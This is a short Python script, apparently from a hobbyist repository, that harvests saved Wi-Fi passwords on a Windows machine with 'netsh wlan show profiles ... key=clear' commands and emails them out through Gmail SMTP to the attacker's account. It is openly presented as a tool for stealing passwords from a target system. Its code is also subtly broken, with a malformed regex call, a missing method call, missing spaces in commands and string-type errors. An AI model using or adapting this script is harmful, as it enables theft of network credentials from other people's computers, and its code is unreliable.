# steling-all-passwod-from-target-system
#runnning some usefull commnd toget passwod of all wifi from target system
import subprocess,smtplib,re
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit

command = "netsh wlan show profiles"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:profiles \s*:\s)(.*\ ), networks")
result =""
for network_names in network_names_list:
    command ="netsh wlan show profiles"+network_names+"key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result
    send_mail("your email", "passwod of email", result)
